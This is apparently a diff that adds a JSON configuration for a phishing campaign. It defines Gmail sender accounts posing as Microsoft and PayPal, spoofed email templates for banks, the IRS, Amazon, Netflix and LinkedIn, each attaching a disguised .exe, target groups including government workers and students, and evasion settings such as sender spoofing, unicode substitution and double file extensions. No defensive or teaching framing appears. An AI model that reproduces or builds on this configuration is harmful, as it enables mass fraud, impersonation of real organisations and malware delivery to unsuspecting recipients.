@@ -1,0 +1,137 @@
+{
+  "gmail_settings": {
+    "smtp_server": "smtp.gmail.com",
+    "smtp_port": 587,
+    "use_tls": true,
+    "use_ssl": false
+  },
+  "sender_accounts": [
+    {
+      "email": "your-gmail@gmail.com",
+      "password": "your-app-password",
+      "display_name": "Microsoft Security Team",
+      "active": true
+    },
+    {
+      "email": "backup-gmail@gmail.com", 
+      "password": "backup-app-password",
+      "display_name": "PayPal Security",
+      "active": false
+    }
+  ],
+  "campaign_settings": {
+    "emails_per_hour": 15,
+    "max_emails_per_day": 200,
+    "delay_between_emails": "30-120 seconds",
+    "retry_failed_emails": true,
+    "max_retries": 3
+  },
+  "email_templates": {
+    "microsoft_security": {
+      "subject": "Urgent: Microsoft Security Update Required",
+      "sender_name": "Microsoft Security Team",
+      "sender_email": "security@microsoft.com",
+      "priority": "high",
+      "attachment_name": "Windows_Security_Update_KB5001234.exe"
+    },
+    "paypal_security": {
+      "subject": "PayPal Account Security Alert",
+      "sender_name": "PayPal Security",
+      "sender_email": "security@paypal.com", 
+      "priority": "high",
+      "attachment_name": "PayPal_Security_Verification.exe"
+    },
+    "linkedin_job": {
+      "subject": "LinkedIn Job Opportunity - Remote Position",
+      "sender_name": "LinkedIn Recruiter",
+      "sender_email": "jobs@linkedin.com",
+      "priority": "medium",
+      "attachment_name": "Job_Application_Form.exe"
+    },
+    "irs_refund": {
+      "subject": "Your Tax Refund is Ready - IRS Notification",
+      "sender_name": "IRS Tax Services",
+      "sender_email": "notifications@irs.gov",
+      "priority": "high",
+      "attachment_name": "IRS_Refund_Verification.exe"
+    },
+    "netflix_suspension": {
+      "subject": "Netflix Account Suspension Notice",
+      "sender_name": "Netflix Support",
+      "sender_email": "support@netflix.com",
+      "priority": "medium",
+      "attachment_name": "Netflix_Payment_Update.exe"
+    },
+    "amazon_prime": {
+      "subject": "Your Amazon Prime membership expires in 3 days",
+      "sender_name": "Amazon Prime",
+      "sender_email": "prime@amazon.com",
+      "priority": "high",
+      "attachment_name": "Amazon_Prime_Renewal.exe"
+    },
+    "bank_security": {
+      "subject": "Bank of America: Unusual Login Activity Detected",
+      "sender_name": "Bank of America Security",
+      "sender_email": "security@bankofamerica.com",
+      "priority": "high",
+      "attachment_name": "BOA_Security_Verification.exe"
+    }
+  },
+  "target_categories": {
+    "corporate_employees": {
+      "description": "Employees of large corporations",
+      "preferred_templates": ["microsoft_security", "linkedin_job"],
+      "email_domains": ["@company.com", "@corporation.com", "@enterprise.com"]
+    },
+    "government_workers": {
+      "description": "Government employees",
+      "preferred_templates": ["irs_refund", "microsoft_security"],
+      "email_domains": ["@gov", "@government.com", "@state.gov"]
+    },
+    "university_students": {
+      "description": "University students and staff",
+      "preferred_templates": ["linkedin_job", "netflix_suspension"],
+      "email_domains": ["@edu", "@university.edu", "@college.edu"]
+    },
+    "general_users": {
+      "description": "General internet users",
+      "preferred_templates": ["amazon_prime", "netflix_suspension", "paypal_security"],
+      "email_domains": ["@gmail.com", "@yahoo.com", "@hotmail.com"]
+    }
+  },
+  "evasion_techniques": {
+    "email_headers": {
+      "add_custom_headers": true,
+      "spoof_sender": true,
+      "use_legitimate_domains": true
+    },
+    "content_obfuscation": {
+      "use_html_encoding": true,
+      "add_invisible_characters": true,
+      "use_unicode_substitution": true
+    },
+    "attachment_disguise": {
+      "use_double_extensions": true,
+      "embed_in_legitimate_files": true,
+      "use_zip_archives": true
+    },
+    "timing_evasion": {
+      "random_delays": true,
+      "business_hours_only": false,
+      "avoid_weekends": false
+    }
+  },
+  "monitoring": {
+    "track_opens": true,
+    "track_clicks": true,
+    "track_attachments": true,
+    "log_all_activity": true
+  },
+  "safety_limits": {
+    "max_emails_per_account_per_day": 100,
+    "cooldown_period_hours": 24,
+    "backup_accounts": 2,
+    "emergency_stop": true
+  }
+}
+
